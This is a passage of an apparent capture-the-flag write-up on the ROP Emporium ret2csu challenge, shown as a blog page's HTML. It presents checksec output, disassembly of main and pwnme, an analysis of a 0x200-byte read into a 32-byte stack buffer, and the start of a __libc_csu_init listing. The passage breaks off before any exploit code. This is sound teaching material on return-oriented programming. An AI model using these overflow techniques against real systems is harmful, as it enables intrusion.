<!DOCTYPE html><html lang="en" class="scroll-smooth"><head><link rel="apple-touch-icon" sizes="76x76" href="/static/favicons/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="/static/favicons/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/static/favicons/favicon-16x16.png"/><link rel="manifest" href="/static/favicons/site.webmanifest"/><link rel="mask-icon" href="/static/favicons/safari-pinned-tab.svg" color="#5bbad5"/><meta name="msapplication-TileColor" content="#000000"/><meta name="theme-color" content="#000000"/><link rel="alternate" type="application/rss+xml" href="/feed.xml"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.css" integrity="sha384-Um5gpz1odJg5Z4HAmzPtgZKdTBHZdw8S29IecapCSB31ligYPhHQZMIlWLYQGVoc" crossorigin="anonymous"/><meta charSet="utf-8"/><script>!function(){try {var d=document.documentElement.classList;d.remove('light','dark');var e=localStorage.getItem('theme');if("system"===e||(!e&&true)){var t="(prefers-color-scheme: dark)",m=window.matchMedia(t);m.media!==t||m.matches?d.add('dark'):d.add('light')}else if(e) d.add(e)}catch(e){}}()</script><meta content="width=device-width, initial-scale=1" name="viewport"/><title>Return-Oriented Programming - Ret2csu</title><meta name="robots" content="follow, index"/><meta name="description" content="Learn a ROP technique that lets you populate useful calling convention registers like rdi, rsi and rdx even in an environment where gadgets are sparse."/><meta property="og:url" content="https://thuri10.github.io/blog/ropemporium-ret2csu"/><meta property="og:type" content="article"/><meta property="og:site_name" content="Solar Bits"/><meta property="og:description" content="Learn a ROP technique that lets you populate useful calling convention registers like rdi, rsi and rdx even in an environment where gadgets are sparse."/><meta property="og:title" content="Return-Oriented Programming - Ret2csu"/><meta property="og:image" content="https://thuri10.github.io"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="https://twitter.com/0xhexski"/><meta name="twitter:title" content="Return-Oriented Programming - Ret2csu"/><meta name="twitter:description" content="Learn a ROP technique that lets you populate useful calling convention registers like rdi, rsi and rdx even in an environment where gadgets are sparse."/><meta name="twitter:image" content="https://thuri10.github.io"/><link rel="canonical" href="https://thuri10.github.io/blog/ropemporium-ret2csu"/><meta property="article:published_time" content="2021-12-20T00:00:00.000Z"/><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "Article",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://thuri10.github.io/blog/ropemporium-ret2csu"
  },
  "headline": "Return-Oriented Programming - Ret2csu",
  "image": [
    {
      "@type": "ImageObject",
      "url": "https://thuri10.github.io"
    }
  ],
  "datePublished": "2021-12-20T00:00:00.000Z",
  "dateModified": "2021-12-20T00:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Thuri"
    }
  ],
  "publisher": {
    "@type": "Organization",
    "name": "Thuri10",
    "logo": {
      "@type": "ImageObject",
      "url": "https://thuri10.github.io/static/images/logo.png"
    }
  },
  "description": "Learn a ROP technique that lets you populate useful calling convention registers like rdi, rsi and rdx even in an environment where gadgets are sparse."
}</script><meta name="next-head-count" content="20"/><link rel="preload" href="/_next/static/css/6e10a27950d06492.css" as="style"/><link rel="stylesheet" href="/_next/static/css/6e10a27950d06492.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-6b07d50b42459591.js" defer=""></script><script src="/_next/static/chunks/main-bc290367bb05fc37.js" defer=""></script><script src="/_next/static/chunks/pages/_app-1e0190b7c08c1a05.js" defer=""></script><script src="/_next/static/chunks/framework-327e104994690a53.js" defer=""></script><script src="/_next/static/chunks/675-74705f4ead346871.js" defer=""></script><script src="/_next/static/chunks/207-dd685ae53e609b20.js" defer=""></script><script src="/_next/static/chunks/620-3362006c15b294ef.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5B...slug%5D-27a5fa894d44d867.js" defer=""></script><script src="/_next/static/WOHMjo6-Jr1hGUuSwf8E-/_buildManifest.js" defer=""></script><script src="/_next/static/WOHMjo6-Jr1hGUuSwf8E-/_ssgManifest.js" defer=""></script><script src="/_next/static/WOHMjo6-Jr1hGUuSwf8E-/_middlewareManifest.js" defer=""></script></head><body class="bg-white text-black antialiased dark:bg-gray-900 dark:text-white"><div id="__next" data-reactroot=""><div class="mx-auto max-w-3xl px-4 sm:px-6 xl:max-w-5xl xl:px-0"><div class="flex h-screen flex-col justify-between"><header class="flex items-center justify-between py-10"><div><a aria-label="Solarbits" href="/"><div class="flex items-center justify-between"><div class="mr-3"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="344.564 330.278 111.737 91.218" width="53.87" height="43.61"><defs><linearGradient id="logo_svg__b" gradientUnits="userSpaceOnUse" x1="420.97" y1="331.28" x2="420.97" y2="418.5"><stop style="stop-color:#06b6d4;stop-opacity:1" offset="0%"></stop><stop style="stop-color:#67e8f9;stop-opacity:1" offset="100%"></stop></linearGradient><linearGradient id="logo_svg__d" gradientUnits="userSpaceOnUse" x1="377.89" y1="331.28" x2="377.89" y2="418.5"><stop style="stop-color:#06b6d4;stop-opacity:1" offset="0%"></stop><stop style="stop-color:#67e8f9;stop-opacity:1" offset="100%"></stop></linearGradient><path d="M453.3 331.28v28.57l-64.66 58.65v-30.08l64.66-57.14Z" id="logo_svg__a"></path><path d="M410.23 331.28v28.57l-64.67 58.65v-30.08l64.67-57.14Z" id="logo_svg__c"></path></defs><use xlink:href="#logo_svg__a" fill="url(#logo_svg__b)"></use><use xlink:href="#logo_svg__c" fill="url(#logo_svg__d)"></use></svg></div><div class="hidden h-6 text-2xl font-semibold sm:block">Solarbits</div></div></a></div><div class="flex items-center text-base leading-5"><div class="hidden sm:block"><a class="p-1 font-medium text-gray-900 dark:text-gray-100 sm:p-4" href="/blog">Blog</a><a class="p-1 font-medium text-gray-900 dark:text-gray-100 sm:p-4" href="/tags">Tags</a><a class="p-1 font-medium text-gray-900 dark:text-gray-100 sm:p-4" href="/about">About</a></div><button aria-label="Toggle Dark Mode" type="button" class="ml-1 mr-1 h-8 w-8 rounded p-1 sm:ml-4"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path></svg></button><div class="sm:hidden"><button type="button" class="ml-1 mr-1 h-8 w-8 rounded py-1" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg></button><div class="fixed top-24 right-0 z-10 h-full w-full transform bg-gray-200 opacity-95 duration-300 ease-in-out dark:bg-gray-800 translate-x-full"><button type="button" aria-label="toggle modal" class="fixed h-full w-full cursor-auto focus:outline-none"></button><nav class="fixed mt-8 h-full"><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/blog">Blog</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/tags">Tags</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/about">About</a></div></nav></div></div></div></header><main class="mb-auto"><div class="mx-auto max-w-3xl px-4 sm:px-6 xl:max-w-5xl xl:px-0"><div class="fixed right-8 bottom-8 hidden flex-col gap-3 md:flex"><button aria-label="Scroll To Comment" type="button" style="opacity:0" class="rounded-full bg-gray-200 p-2 text-gray-500 transition-all hover:bg-gray-300 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600"><svg class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M18 10c0 3.866-3.582 7-8 7a8.841 8.841 0 01-4.083-.98L2 17l1.338-3.123C2.493 12.767 2 11.434 2 10c0-3.866 3.582-7 8-7s8 3.134 8 7zM7 9H5v2h2V9zm8 0h-2v2h2V9zM9 9h2v2H9V9z" clip-rule="evenodd"></path></svg></button><button aria-label="Scroll To Top" type="button" style="opacity:0" class="rounded-full bg-gray-200 p-2 text-gray-500 transition-all hover:bg-gray-300 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600"><svg class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M3.293 9.707a1 1 0 010-1.414l6-6a1 1 0 011.414 0l6 6a1 1 0 01-1.414 1.414L11 5.414V17a1 1 0 11-2 0V5.414L4.707 9.707a1 1 0 01-1.414 0z" clip-rule="evenodd"></path></svg></button></div><article><div class="xl:divide-y xl:divide-gray-200 xl:dark:divide-gray-700"><header class="relative pt-6 xl:pb-6"><div class="space-y-1 text-center"><dl class="space-y-10"><div><dt class="sr-only">Published on</dt><div><h1 class="text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14">Return-Oriented Programming - Ret2csu</h1></div><dd class="flex items-center justify-center text-base font-medium leading-6 text-gray-500 dark:text-gray-400"><time dateTime="2021-12-20" class="flex items-center"><i class="twa  twa-calendar undefined"></i><span class="m1-1">Monday, December 20, 2021</span></time><span class="mx-2">-</span><div class="flex items-center"><i class="twa  twa-hourglass-not-done undefined"></i><span class="ml-1">18 mins read</span></div></dd></div></dl></div></header><div class="divide-y divide-gray-200 pb-8 dark:divide-gray-700 xl:grid xl:grid-cols-4 xl:gap-x-6 xl:divide-y-0" style="grid-template-rows:auto 1fr"><dl class="pt-6 pb-10 xl:border-b xl:border-gray-200 xl:pt-11 xl:dark:border-gray-700"><dt class="sr-only">Authors</dt><dd><ul class="flex justify-center space-x-8 sm:space-x-12 xl:block xl:space-x-0 xl:space-y-8"><li class="flex items-center space-x-2"><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%2738%27%20height=%2738%27/%3e"/></span><img alt="avatar" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" class="h-10 w-10 rounded-full" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="avatar" src="/static/images/avatar.png" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" class="h-10 w-10 rounded-full" loading="lazy"/></noscript></span><dl class="whitespace-nowrap text-sm font-medium leading-5"><dt class="sr-only">Name</dt><dd class="text-gray-900 dark:text-gray-100">Thuri</dd><dt class="sr-only">Twitter</dt><dd></dd></dl></li></ul></dd></dl><div class="divide-y divide-gray-200 dark:divide-gray-700 xl:col-span-3 xl:row-span-2 xl:pb-0"><div class="prose max-w-none pt-10 pb-8 dark:prose-dark"><h1 id="introduction"><a href="#introduction" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Introduction</h1><p>Challenge description</p><blockquote><p>We&#x27;re back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them? The goal of this level is understanding of universal rop techniques due to to the limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website <a target="_blank" rel="noopener noreferrer" href="https://ropemporium.com">Ropemporium</a></p></blockquote><p>After downloading the binary, check the enabled protections and mitigation&#x27;s. Only <strong>NX</strong> and Partial RELRO protections are turned on as shown below.</p><div class="relative"><pre><code class="code-highlight language-bash"><span class="code-line">    Arch:     amd64-64-little
</span><span class="code-line">    RELRO:    Partial RELRO
</span><span class="code-line">    Stack:    No canary found
</span><span class="code-line">    NX:       NX enabled
</span><span class="code-line">    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</span></code></pre></div><p>First step is to find the vulnerability in the binary that will enable us to subvert the program execution control flow. From the disassembly of the main function we are only calling <strong>pwnme</strong> function.</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line">(gdb) disas main
</span><span class="code-line">Dump of assembler code for function main:
</span><span class="code-line">   <span class="token number">0x0000000000400607</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">&gt;</span>:	push   <span class="token register variable">rbp</span>
</span><span class="code-line">   <span class="token number">0x0000000000400608</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
</span><span class="code-line">   <span class="token number">0x000000000040060b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x400500</span> <span class="token operator">&lt;</span>pwnme@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x0000000000400610</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">9</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
</span><span class="code-line">   <span class="token number">0x0000000000400615</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">14</span><span class="token operator">&gt;</span>:	pop    <span class="token register variable">rbp</span>
</span><span class="code-line">   <span class="token number">0x0000000000400616</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">15</span><span class="token operator">&gt;</span>:	ret    
</span><span class="code-line">End of assembler dump.
</span></code></pre></div><p>The function reference the got table in order to load the actual address of pwnme function from <strong>libret2csu.so</strong> library after the first call.</p><h2 id="pwnme-function-disassembly"><a href="#pwnme-function-disassembly" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>pwnme Function Disassembly</h2><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line">(gdb) disas pwnme
</span><span class="code-line">Dump of assembler code for function pwnme:
</span><span class="code-line">  <span class="token number">0x000000000000093a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">&gt;</span>:	push   <span class="token register variable">rbp</span>
</span><span class="code-line">  <span class="token number">0x000000000000093b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
</span><span class="code-line">  <span class="token number">0x000000000000093e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">&gt;</span>:	sub    <span class="token register variable">rsp</span>,<span class="token number">0x20</span>
</span><span class="code-line">  <span class="token number">0x0000000000000942</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rax</span>,QWORD PTR <span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x201697</span><span class="token operator">]</span>        # <span class="token number">0x201fe0</span>
</span><span class="code-line">  <span class="token number">0x0000000000000949</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">15</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rax</span>,QWORD PTR <span class="token operator">[</span><span class="token register variable">rax</span><span class="token operator">]</span>
</span><span class="code-line">  <span class="token number">0x000000000000094c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">18</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">ecx</span>,<span class="token number">0x0</span>
</span><span class="code-line">  <span class="token number">0x0000000000000951</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">23</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x2</span>
</span><span class="code-line">  <span class="token number">0x0000000000000956</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">28</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">esi</span>,<span class="token number">0x0</span>
</span><span class="code-line">  <span class="token number">0x000000000000095b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">33</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rdi</span>,<span class="token register variable">rax</span>
</span><span class="code-line">  <span class="token number">0x000000000000095e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">36</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x820</span> <span class="token operator">&lt;</span>setvbuf@plt<span class="token operator">&gt;</span>
</span><span class="code-line">  <span class="token number">0x0000000000000963</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">41</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x31e</span><span class="token operator">]</span>        # <span class="token number">0xc88</span>
</span><span class="code-line">  <span class="token number">0x000000000000096a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">48</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x7a0</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
</span><span class="code-line">  <span class="token number">0x000000000000096f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">53</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x32a</span><span class="token operator">]</span>        # <span class="token number">0xca0</span>
</span><span class="code-line">  <span class="token number">0x0000000000000976</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x7a0</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
</span><span class="code-line">  <span class="token number">0x000000000000097b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">65</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
</span><span class="code-line">  <span class="token number">0x000000000000097f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">69</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x20</span>
</span><span class="code-line">  <span class="token number">0x0000000000000984</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">74</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">esi</span>,<span class="token number">0x0</span>
</span><span class="code-line">  <span class="token number">0x0000000000000989</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">79</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rdi</span>,<span class="token register variable">rax</span>
</span><span class="code-line">  <span class="token number">0x000000000000098c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">82</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x7d0</span> <span class="token operator">&lt;</span>memset@plt<span class="token operator">&gt;</span>
</span><span class="code-line">  <span class="token number">0x0000000000000991</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">87</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x310</span><span class="token operator">]</span>        # <span class="token number">0xca8</span>
</span><span class="code-line">  <span class="token number">0x0000000000000998</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">94</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x7a0</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
</span><span class="code-line">  <span class="token number">0x000000000000099d</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">99</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x36e</span><span class="token operator">]</span>        # <span class="token number">0xd12</span>
</span><span class="code-line">  <span class="token number">0x00000000000009a4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">106</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
</span><span class="code-line">  <span class="token number">0x00000000000009a9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">111</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x7c0</span> <span class="token operator">&lt;</span>printf@plt<span class="token operator">&gt;</span>
</span><span class="code-line">  <span class="token number">0x00000000000009ae</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">116</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
</span><span class="code-line">  <span class="token number">0x00000000000009b2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">120</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x200</span>
</span><span class="code-line">  <span class="token number">0x00000000000009b7</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">125</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rsi</span>,<span class="token register variable">rax</span>
</span><span class="code-line">  <span class="token number">0x00000000000009ba</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">128</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x0</span>
</span><span class="code-line">  <span class="token number">0x00000000000009bf</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">133</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x7f0</span> <span class="token operator">&lt;</span>read@plt<span class="token operator">&gt;</span>
</span><span class="code-line">  <span class="token number">0x00000000000009c4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">138</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x34a</span><span class="token operator">]</span>        # <span class="token number">0xd15</span>
</span><span class="code-line">  <span class="token number">0x00000000000009cb</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">145</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x7a0</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
</span><span class="code-line">  <span class="token number">0x00000000000009d0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">150</span><span class="token operator">&gt;</span>:	nop
</span><span class="code-line">  <span class="token number">0x00000000000009d1</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">151</span><span class="token operator">&gt;</span>:	leave  
</span><span class="code-line">  <span class="token number">0x00000000000009d2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">152</span><span class="token operator">&gt;</span>:	ret    
</span><span class="code-line">End of assembler dump.
</span><span class="code-line">(gdb) 
</span></code></pre></div><p>From the above disassembled code, we are reading more than the allocated buffer from the standard input, therefore leading to stack buffer overflow and corrupting the adjacent memory region. The program allocates a stack of fixed size 32bytes. we are reading <strong>0x200</strong> from the standard input file descriptor, which is more than the buffer size. The c equivalent of the above vulnerability is,</p><div class="relative"><pre><code class="code-highlight language-c"><span class="code-line"><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>rbp<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span> #reading <span class="token number">0x200</span> from the <span class="token constant">stdin</span>
</span></code></pre></div><p>For exploitation purpose, is to control the return address of the pwnme function and redirect the execution to our desired address. In order to control the return address we need to fill the buffer with enough data and overflow the saved base pointer.</p><div><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27209%27%20height=%27256%27/%3e"/></span><img alt="ret control" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="ret control" src="/static/images/ropemporium/stack.png" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div><p>From the stack image layout above, we need 32 bytes to fill the buffer, 8 bytes to overwrite the saved base pointer and 8 bytes to control return address. Because the <strong>NX</strong> execution is enabled on the binary, we can`t use the shellcode techniques, therefore we use other methods such a ropping.</p><h2 id="libc_csu_init-disassembly"><a href="#libc_csu_init-disassembly" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a><strong>libc_csu_init</strong> Disassembly</h2><p>Below is the disassembled code for <strong>__libc_csu_init</strong> section for the ret2csu binary using objdump tool.objdump is a linux command line tool used for disassembling binaries.</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line"><span class="token number">0000000000400640</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">&gt;</span>:
</span><span class="code-line">  <span class="token number">400640</span>:	<span class="token number">41</span> <span class="token number">57</span>                	push   <span class="token register variable">r15</span>
</span><span class="code-line">  <span class="token number">400642</span>:	<span class="token number">41</span> <span class="token number">56</span>                	push   <span class="token register variable">r14</span>
</span><span class="code-line">  <span class="token number">400644</span>:	<span class="token number">49</span> <span class="token number">89</span> d7             	mov    <span class="token register variable">r15</span>,<span class="token register variable">rdx</span>
</span><span class="code-line">  <span class="token number">400647</span>:	<span class="token number">41</span> <span class="token number">55</span>                	push   <span class="token register variable">r13</span>
</span><span class="code-line">  <span class="token number">400649</span>:	<span class="token number">41</span> <span class="token number">54</span>                	push   <span class="token register variable">r12</span>
</span><span class="code-line">  40064b:	4c <span class="token number">8d</span> <span class="token number">25</span> 9e <span class="token number">07</span> <span class="token number">20</span> <span class="token number">00</span> 	lea    <span class="token register variable">r12</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x20079e</span><span class="token operator">]</span>        # 600df0 <span class="token operator">&lt;</span>__frame_dummy_init_array_entry<span class="token operator">&gt;</span>
</span><span class="code-line">  <span class="token number">400652</span>:	<span class="token number">55</span>                   	push   <span class="token register variable">rbp</span>
</span><span class="code-line">  <span class="token number">400653</span>:	<span class="token number">48</span> <span class="token number">8d</span> <span class="token number">2d</span> 9e <span class="token number">07</span> <span class="token number">20</span> <span class="token number">00</span> 	lea    <span class="token register variable">rbp</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x20079e</span><span class="token operator">]</span>        # 600df8 <span class="token operator">&lt;</span>__do_<span class="token keyword">global_dtors_aux_fini_array_entry&gt;</span>
</span><span class="code-line">  40065a:	<span class="token number">53</span>                   	push   <span class="token register variable">rbx</span>
</span><span class="code-line">  40065b:	<span class="token number">41</span> <span class="token number">89</span> fd             	mov    <span class="token register variable">r13d</span>,<span class="token register variable">edi</span>
</span><span class="code-line">  40065e:	<span class="token number">49</span> <span class="token number">89</span> f6             	mov    <span class="token register variable">r14</span>,<span class="token register variable">rsi</span>
</span><span class="code-line">  <span class="token number">400661</span>:	4c <span class="token number">29</span> e5             	sub    <span class="token register variable">rbp</span>,<span class="token register variable">r12</span>
</span><span class="code-line">  <span class="token number">400664</span>:	<span class="token number">48</span> <span class="token number">83</span> ec <span class="token number">08</span>          	sub    <span class="token register variable">rsp</span>,<span class="token number">0x8</span>
</span><span class="code-line">  <span class="token number">400668</span>:	<span class="token number">48</span> c1 fd <span class="token number">03</span>          	sar    <span class="token register variable">rbp</span>,<span class="token number">0x3</span>
</span><span class="code-line">  40066c:	e8 5f fe ff ff       	call   4004d0 <span class="token operator">&lt;</span>_init<span class="token operator">&gt;</span>
</span><span class="code-line">  <span class="token number">400671</span>:	<span class="token number">48</span> <span class="token number">85</span> ed             	test   <span class="token register variable">rbp</span>,<span class="token register variable">rbp</span>
</span><span class="code-line">  <span class="token number">400674</span>:	<span class="token number">74</span> <span class="token number">20</span>                	je     <span class="token number">400696</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">0x56</span><span class="token operator">&gt;</span>
</span><span class="code-line">  <span class="token number">400676</span>:	<span class="token number">31</span> db                	xor    <span class="token register variable">ebx</span>,<span class="token register variable">ebx</span>
